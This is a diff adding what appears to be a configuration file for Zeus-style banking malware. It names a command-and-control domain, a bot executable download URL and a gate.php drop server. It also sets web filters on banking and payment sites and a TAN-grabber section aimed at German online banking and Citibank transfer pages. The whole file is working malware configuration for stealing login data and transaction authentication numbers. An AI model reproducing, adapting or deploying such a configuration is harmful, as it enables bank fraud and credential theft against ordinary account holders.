@@ -1,0 +1,45 @@
+;Build time:   09:48:52 12.08.2009 GMT
+;Version:      1.2.7.11
+
+entry "StaticConfig"
+  ;botnet "btn1"
+  timer_config 60 1
+  timer_logs 1 1
+  timer_stats 20 1
+  url_config "http://cecilzfunz.com/123/cfg2.bin"
+  url_compip "http://www.whatsmyipaddress.com/" 4096
+  encryption_key "123asd"
+  ;blacklist_languages 1049
+end 
+
+entry "DynamicConfig"
+  url_loader "http://cecilzfunz.com/123/bot.exe"
+  url_server "http://cecilzfunz.com/123/gate.php"
+  file_webinjects "webinjects.txt"
+  entry "AdvancedConfigs"
+    ;"http://advdomain/cfg1.bin"
+  end
+  entry "WebFilters"
+    "!*.microsoft.com/*"
+    "!http://*myspace.com*"
+    "https://www.gruposantander.es/*"
+    "!http://*odnoklassniki.ru/*"
+    "!http://vkontakte.ru/*"
+    "@*/login.osmp.ru/*"
+    "@*/atl.osmp.ru/*"
+  end
+  entry "WebDataFilters"
+    ;"http://mail.rambler.ru/*" "passw;login"
+  end
+  entry "WebFakes"
+    ;"http://www.google.com" "http://www.yahoo.com" "GP" "" ""
+  end
+  entry "TANGrabber"
+    "https://banking.*.de/cgi/ueberweisung.cgi/*" "S3R1C6G" "*&tid=*" "*&betrag=*"
+    "https://internetbanking.gad.de/banking/*" "S3C6" "*" "*" "KktNrTanEnz"
+    "https://www.citibank.de/*/jba/mp#/SubmitRecap.do" "S3C6R2" "SYNC_TOKEN=*" "*"
+  end
+  entry "DnsMap"
+    ;127.0.0.1 microsoft.com
+  end
+end
